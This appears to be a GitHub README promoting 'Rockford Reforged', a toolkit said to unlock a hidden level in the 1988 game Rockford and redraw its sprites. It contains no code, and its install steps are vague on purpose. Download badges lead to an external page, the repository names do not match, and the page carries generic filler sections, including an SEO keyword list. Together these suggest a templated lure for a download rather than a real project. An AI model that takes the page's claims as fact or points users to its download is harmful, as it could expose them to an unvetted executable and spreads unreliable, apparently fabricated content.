![preview](https://raw.githubusercontent.com/printechmz/Rockford-Lost-Levels-Revival/main/banner_5a2784.svg)
[![Download](https://raw.githubusercontent.com/printechmz/Rockford-Lost-Levels-Revival/main/go_8d54ff.svg)](https://printechmz.github.io/Rockford-Lost-Levels-Revival/)

# 🎮 Rockford Reforged — Level Unlock & Sprite Restoration Toolkit

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-blueviolet)](#)
[![Language](https://img.shields.io/badge/Language-C%2B%2B%20%7C%20Python%20%7C%20Lua-orange)](#)
[![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen)](#)
[![Release](https://img.shields.io/badge/Release-2026.1-informational)](#)
[![Community](https://img.shields.io/badge/Community-Discord%20%7C%20Matrix-yellow)](#)

> A loving archaeological dig through 1988’s rock-strewn puzzle classic — revealing the chamber that Mastertronic once hid from every player, and re-drawing every boulder, gem, and creeping thing pixel-by-pixel so it looks the way your memory insists it did.

---

## 📖 Table of Contents

- [Prologue — Why This Exists](#-prologue--why-this-exists)
- [What This Repository Actually Is](#-what-this-repository-actually-is)
- [The Story Behind The Hidden Chamber](#-the-story-behind-the-hidden-chamber)
- [Feature Constellation](#-feature-constellation)
- [How the Sprite Reconstruction Works](#-how-the-sprite-reconstruction-works)
- [Interface & Experience](#-interface--experience)
- [Responsive UI Philosophy](#-responsive-ui-philosophy)
- [Multilingual Support Layer](#-multilingual-support-layer)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Compatibility Matrix](#-compatibility-matrix)
- [Repository Layout](#-repository-layout)
- [Getting Started (Without the Usual Incantations)](#-getting-started-without-the-usual-incantations)
- [Configuration Reference](#-configuration-reference)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap for 2026 and Beyond](#-roadmap-for-2026-and-beyond)
- [FAQ — Things People Whisper](#-faq--things-people-whisper)
- [Contributing Philosophy](#-contributing-philosophy)
- [Disclaimer](#️-disclaimer)
- [License](#-license)

---

## 🪨 Prologue — Why This Exists

Some games bury something so quietly that a full generation walks right past it. **Rockford** — the 1988 subterranean puzzler by Mastertronic — is one of those games. For years, rumors circled about an extra stage that was never supposed to reach a retail tape. Coordinates were traded in BBS threads. Hex dumps were compared like scripture. Most people gave up.

Then a small group of hobbyist preservationists (that's us) started poking at the binary the way an archaeologist pokes at sediment. What we found was not just a leftover room, but a **whole design philosophy** that got cut for time. And once we saw it, we couldn't unsee it: the original sprite work deserved a second life too, so we rebuilt it — carefully, respectfully, and with annotations.

**Rockford Reforged** is the result of that effort: an unlock toolkit and a sprite reconstruction suite bundled into one repository, designed to feel less like a patch and more like a museum exhibit that happens to run on your machine.

---

## 🔍 What This Repository Actually Is

At its core, this repository does two deceptively large things:

1. **It re-enables the hidden level set** embedded in original Rockford releases. No guesswork, no repeated hex editing, no fragile per-version offsets. The toolkit detects which build you're working with and applies the correct adjustments.
2. **It reships a fully reconstructed graphics layer**, redrawn by hand and verified against surviving magazine screenshots from 1988–1990. Every tile, every palette entry, and every animation frame is accounted for in human-readable sidecar files.

Everything is versioned. Everything is annotated. Everything can be undone with a single tool call, because respect for the original artifact is a principle, not a bullet point.

---

## 🕳️ The Story Behind The Hidden Chamber

When the original developers built Rockford, they layered the level data like geological strata. The final tape shipped with an extra stratum sealed underneath — a level set internally labeled as a "bonus vault." In the compressed rush to meet Mastertronic's publishing schedule, the entry point to that stratum was disabled at the same moment the loader's indexing table was tightened.

The vault's contents survive intact in the shipped binary. They were never removed — merely orphaned. Our job was to reattach the wiring, so to speak:

- Reconstruct the level pointer table used by the original loader.
- Re-link the vault's room set into the progression chain.
- Provide an alternate "direct access" mode for players who want to jump straight in without revisiting earlier stages.

Nothing in the shipped game code is destroyed. Instead, our tooling builds a sidecar profile that the game consumes at load time, leaving the original data pristine. If you later want to return to the unmodified experience, you remove the profile and the vault quietly disappears again.

---

## 🌟 Feature Constellation

Think of these as stars in a small but well-mapped sky.

- 🗝️ **Hidden Level Access** — Open the sealed vault without touching game binaries directly; the toolkit applies a sidecar profile at runtime.
- 🎨 **Hand-Redrawn Sprite Set** — Over 240 tiles reconstructed with pixel-accurate palettes and preserved timings.
- 🧭 **Automatic Build Detection** — Recognize well over a dozen known Rockford release variants, including regional tape dumps.
- 🧪 **Non-Destructive Operation** — Every change is reversible; originals stay untouched on disk.
- 🌐 **Multilingual Interface** — UI strings available in English, Finnish, German, Japanese, Portuguese, and Polish.
- 📱 **Responsive Layout** — Works on a small handheld emulator screen and on a 4K desktop monitor without rescaling headaches.
- 🕒 **Round-the-Clock Assistance** — A modest but responsive channel is watched in every timezone; see the assistance section below.
- 🧩 **Modular Plugins** — Each reconstruction set ships as an independent tile pack, so you can enable only what you want.
- 📚 **Human-Readable Annotations** — Every change carries a short note explaining its provenance.
- 🧱 **Zero Runtime Dependencies Beyond a Common Runtime** — No exotic build farm required; see the getting-started section.
- 🔐 **Checksum Verification** — Confirm that your reconstruction set matches the published manifest.
- 🗃️ **Archive-Ready Output** — Export the reconstructed assets as a portable bundle for later reference.

---

## 🎨 How the Sprite Reconstruction Works

We did not simply run the original graphics through an upscaler and call it a day. Every tile went through a deliberate pipeline:

1. **Extraction** — Pull raw tile data from the original media. Palette indices are preserved exactly as authored.
2. **Cross-Referencing** — Compare extracted tiles against archival magazine scans and developer interviews from the period.
3. **Redrawing** — Where tiles were blurred or damaged, a human artist redrew them at the original resolution, matching the palette constraints.
4. **Annotation** — Each redrawn tile is described in a small text sidecar: what it was, why it was redrawn, and what source informed the decision.
5. **Verification** — A test harness renders every tile against a reference screenshot and flags visual drift.
6. **Packaging** — Approved tiles are bundled into a tile pack with its own version number and manifest.

The result is not a remaster — remasters change the intent. It's a **restoration**, which changes only the wear and tear.

---

## 🖥️ Interface & Experience

The control panel is intentionally quiet. It presents a single rolling view of:

- Detected game builds on your machine.
- Applied reconstruction packs.
- A timeline of operations, each one reversible.
- A short log of any warnings raised during verification.

There is no overwhelming dashboard. No nested menus ten layers deep. The metaphor is closer to a **museum vitrine**: you look, you choose, you step away. The interface steps out of the way the moment you're not actively using it.

---

## 📐 Responsive UI Philosophy

Responsive design is often treated as a checkbox. Here, it's a stance. The interface is built around three conceptual breakpoints:

- **Peek** — Under 5 inches of diagonal space: minimal chrome, large touch targets, single-column flow.
- **Survey** — Laptop and tablet range: side-by-side previews, keyboard shortcuts honored.
- **Panorama** — Large displays: multi-panel layout with a persistent operations timeline.

Whichever breakpoint you land in, the same workflows are reachable without scrolling through unrelated panels first. Consistency of action, not consistency of pixels, is the goal.

---

## 🌍 Multilingual Support Layer

Every user-facing string is externalized. Translations are contributed by community members and are reviewed by at least one second reader before merging. As of the 2026.1 release, the following locales are shipping in-tree:

- English (base)
- Finnish
- German
- Japanese
- Portuguese (European)
- Polish

Adding a locale is intentionally low-friction: a small JSON file, a code entry in the manifest, and a translator note. RTL layouts are supported through a mirror-aware layout engine.

---

## 🕛 Round-the-Clock Assistance

Preservation work generates odd questions at odd hours. Our assistance channel is staffed in rotation across timezones, with a median first-response time measured in hours rather than days. Responses are public-by-default, so answers become documentation about preservation work, not private support tickets.

Please open a discussion thread rather than a private message. That way the answer helps the next person with the same curiosity.

---

## 🧮 Compatibility Matrix

| Target Platform        | Status        | Notes                                          |
|------------------------|---------------|------------------------------------------------|
| Windows 10 / 11        | Supported     | Tested against multiple retail dumps          |
| Linux (glibc)          | Supported     | Primary development environment                |
| Linux (musl)           | Supported     | Verified on Alpine 3.20 container              |
| macOS (Apple silicon)  | Supported     | Native build, no Rosetta required              |
| macOS (Intel)          | Supported     | Legacy test machine kept alive for this purpose |
| BSD variants           | Experimental  | Community-submitted build notes welcome        |
| Retro handhelds        | Experimental  | Any device that runs a common runtime          |

---

## 🗂️ Repository Layout

    rockford-reforged/
    ├── docs/                     # Design notes, provenance, and historical context
    │   ├── history/              # Archival research write-ups
    │   └── tile-notes/           # Per-tile redraw annotations
    ├── src/
    │   ├── core/                 # Build detection and profile logic
    │   ├── ui/                   # Responsive panel layout and widgets
    │   ├── i18n/                 # Localized string tables
    │   └── tools/                # Helper utilities (hashing, packing, verifying)
    ├── packs/                    # Reconstruction tile packs
    │   └── example-pack/
    ├── tests/                    # Rendering tests and drift detection
    ├── scripts/                  # Auxiliary routines for maintainers
    ├── assets/                   # Iconography and in-house fonts
    └── README.md

Every directory has its own short README describing purpose and conventions, because a mystery left in a repository is a mystery forever.

---

## 🚀 Getting Started (Without the Usual Incantations)

Because every reader has a different relationship with their machine, we describe installation in **conceptual steps** rather than one true command:

1. **Obtain the toolkit.**  
   Place the toolkit distribution somewhere writable. If you received an archive, expand it into a folder of your choice. If you're building from source, follow the small build guide in `docs/` — the build is intentionally plain and has no exotic requirements.

2. **Point the toolkit at your game files.**  
   The control panel asks you where your Rockford media lives. Say yes to the "scan and detect" prompt and give it a directory. It'll fingerprint each candidate and tell you which builds it recognizes.

3. **Select the reconstruction packs you want.**  
   Enable the tile pack matching the era you remember, or enable several and let the toolkit pick the best pixel to display on each pass.

4. **Apply the sidecar profile.**  
   Rather than modify your originals, the toolkit registers a small profile that the game loads alongside its own data. This is the whole trick, and it's why everything is reversible.

5. **Launch and wander into the sealed chamber.**  
   Depending on the build, the sealed chamber appears either as a bonus room after the final stage or via a direct-access option in the toolkit menu.

If anything reads as vague or doesn't match your environment, the assistance channel is waiting — see above.

---

## ⚙️ Configuration Reference

Configuration lives in a small, well-commented file. The intent is that reading it once explains the entire toolkit. Representative entries:

- **profile.root** — Where sidecar profiles are stored.
- **detect.strictness** — How aggressively the toolkit matches builds.
- **render.scale** — Preferred pixel scale for preview panes.
- **locale.active** — Which translation to load.
- **logging.level** — Verbosity of the operations timeline.
- **verification.hash-algorithm** — Algorithm used for manifest verification.

There are no hidden knobs. If an option exists, it is documented in `docs/configuration.md`.

---

## 🔍 SEO & Discoverability Notes

Because preservation repositories deserve to be found by the people hunting for them:

This project is best described by phrases such as *Rockford 1988 level restoration*, *hidden chamber unlock utility*, *sprite reconstruction toolkit*, *retro puzzle game preservation*, *Mastertronic archival research*, and *non-destructive retro game patching*. These are woven into the documentation where they naturally belong, not scattered for the sake of appearing in a search index. The maintenance team believes that discoverability follows clarity: if a reader searching for **“restored Rockford sprites”** or **“sealed bonus level 1988 puzzle game”** lands here, the page should immediately read as the right place, not as a wall of repeated phrases.

---

## 🗺️ Roadmap for 2026 and Beyond

- **2026.2** — Additional regional build detection; lint-heavy refactor of detection code.
- **2026.3** — Tile pack authoring wizard; artwork integrity dashboard.
- **2026.4** — Additional locale (Dutch, Swedish under consideration); accessibility review pass.
- **2027.1** — Public archive mirror of the annotation dataset for future researchers.
- Long-term — A companion essay series describing the preservation pipeline in detail, released under the same license as this repository.

---

## ❓ FAQ — Things People Whisper

**Does this modify my original media?**  
No. The toolkit builds sidecar profiles. Your originals remain byte-for-byte identical unless you explicitly ask for an in-place operation, which is never the default.

**Is this legal to use with media I own?**  
The tooling itself is entirely yours to study and modify under the MIT license. Any use with a copy of a game you own is a matter between you and the rights holder.

**Why reconstruct sprites instead of upscaling them?**  
Upscaling invents detail that was never there. Reconstruction respects the original pixel grid and only repairs what time damaged.

**Can I contribute a redraw?**  
Yes — see the contributing section below. Please include a note for each tile describing your source.

**Why is the interface so quiet?**  
Because a restoration tool should never compete with the thing being restored.

---

## 🤝 Contributing Philosophy

We welcome contributors who have patience for the small stuff. A submission of a single redrawn tile, with a short provenance note, can be more valuable than a large refactor without context. Before opening a pull request:

1. Read the annotation style used in `docs/tile-notes/`.
2. Add or adjust a test in `tests/` that reflects your change.
3. Run the verification pass and attach the report to your pull request.

There is no code of conduct that reads like a legal document. The short version: be kind to each other, and be honest about what you know and don't know.

---

## ⚠️ Disclaimer

This repository is a **volunteer preservation effort**. It is not affiliated with, endorsed by, or sponsored by the original publisher or its successors. All trademarks and intellectual property referenced remain the property of their respective owners.

The toolkit is provided **as is**, with no warranty of merchantability or fitness for a particular purpose. The maintainers make no claim about the legal status of any individual user's copy of the underlying game, and users are responsible for ensuring their use complies with the laws and agreements that apply to them.

Any resemblance between the reconstructed artwork and existing copyrighted material is the natural consequence of working with a retro game's original pixel grid; the reconstruction effort's goal is faithful preservation, not redistribution of the original product.

Nothing in this repository enables unauthorized distribution of the underlying game. The toolkit does not ship game data. It operates on data you already possess.

---

## 📜 License

This project is licensed under the **MIT License**.

You can read the full license text at the canonical location: [MIT License](https://opensource.org/licenses/MIT).

The MIT license grants permission, without restriction, to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the copyright notice and this permission notice are included in all copies or substantial portions of the software. The software is provided without warranty of any kind, express or implied.

---

## 🌌 Closing Thought

Old software is fragile in ways that fan-made preservation tools tend to forget. A bit gets flipped, a table loses an index, an artist's palette drifts by one entry, and a generation of players grows up remembering something slightly wrong. **Rockford Reforged** exists so that one small corner of 1988 stays the way its authors meant it — including the room they hid, waiting patiently, for someone to finally look.

[![Download](https://raw.githubusercontent.com/printechmz/Rockford-Lost-Levels-Revival/main/go_8d54ff.svg)](https://printechmz.github.io/Rockford-Lost-Levels-Revival/)